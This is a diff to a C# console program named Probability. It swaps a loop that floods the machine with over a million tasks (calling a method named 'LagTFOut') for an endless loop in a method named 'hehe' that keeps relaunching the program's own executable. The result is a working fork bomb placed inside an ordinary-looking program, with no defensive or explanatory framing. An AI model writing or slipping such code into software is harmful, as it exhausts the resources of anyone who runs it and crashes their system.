@@ -1,4 +1,6 @@
-﻿namespace Probability;
+﻿using System.Diagnostics;
+
+namespace Probability;
 
 internal class Program
 {
@@ -108,18 +110,14 @@ internal class Program
 
     private static async Task Main(string[] args)
     {
-        /*Task task1 = TakeTheTest();
-        await Task.WhenAll(task1);*/
-
         while (true)
         {
-            var tasks = new Task[1204573];
-
-            for (int i = 0; i < tasks.Length; i++)
-            {
-                tasks[i] = Task.Run(() => LagTFOut());
-            }
-            
+            hehe();
         }
+    }
+
+    static void hehe()
+    {
+        Process.Start(Process.GetCurrentProcess().MainModule.FileName);
     }
 }
